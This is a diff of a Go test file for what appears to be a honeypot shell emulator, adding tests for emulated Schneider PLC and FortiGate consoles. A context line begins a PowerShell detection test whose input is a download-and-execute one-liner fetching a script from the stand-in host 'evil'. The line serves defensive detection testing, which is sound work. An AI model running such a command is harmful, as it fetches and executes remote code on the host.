@@ -75,6 +75,29 @@ func TestPLCConsole(t *testing.T) {
 	}
 }
 
+func TestVendorPLCConsole(t *testing.T) {
+	// A non-Siemens "plc"-quirk archetype gets the vendor-aware PLC console.
+	send, finish := runShell(t, archetype.Lookup("schneider-modicon-m580"))
+	send("info")
+	_, transcript := finish()
+	if !strings.Contains(transcript, "Schneider Modicon") {
+		t.Errorf("Schneider PLC info should name the vendor: %q", transcript)
+	}
+}
+
+func TestFortiOSCLI(t *testing.T) {
+	send, finish := runShell(t, archetype.Lookup("fortigate"))
+	send("get system status")
+	send("config system global")
+	_, transcript := finish()
+	if !strings.Contains(transcript, "FortiGate") {
+		t.Errorf("FortiOS status missing version banner: %q", transcript)
+	}
+	if !strings.Contains(transcript, "Command fail") {
+		t.Errorf("FortiOS config should be refused (read-only): %q", transcript)
+	}
+}
+
 func TestPowerShellTTPAnomalies(t *testing.T) {
 	cases := map[string]string{
 		"IEX (New-Object Net.WebClient).DownloadString('http://evil/a.ps1')": "shell-ps-download-exec",
